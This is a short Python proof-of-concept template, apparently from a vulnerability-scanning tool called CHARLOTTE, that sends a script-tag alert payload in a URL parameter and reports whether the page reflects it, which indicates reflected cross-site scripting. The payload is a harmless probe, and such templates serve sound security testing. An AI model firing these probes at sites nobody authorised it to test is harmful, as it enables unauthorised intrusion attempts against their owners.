"""
Proof-of-Concept: Cross-Site Scripting (XSS) - CWE-79
CHARLOTTE Template Stub (Auto-Adaptive)
"""

import requests

def run_xss_poc(finding):
    target_url = finding.get("url", "http://example.com/search")
    param = finding.get("param", "q")
    payload = "<script>alert('CHARLOTTE')</script>"

    print(f"[*] Sending XSS payload to {target_url}?{param}={payload}")
    try:
        response = requests.get(target_url, params={param: payload}, timeout=10)
        if payload in response.text:
            print("[+] XSS vulnerability confirmed!")
        else:
            print("[-] Payload not reflected. Further testing needed.")
    except Exception as e:
        print(f"[!] Error: {e}")

# Example call:
# run_xss_poc({ "url": "http://target.com/search", "param": "q" })
# This code is a template for a Cross-Site Scripting (XSS) proof-of-concept (PoC).
# It sends a crafted request to a target URL with a malicious script in the query parameter.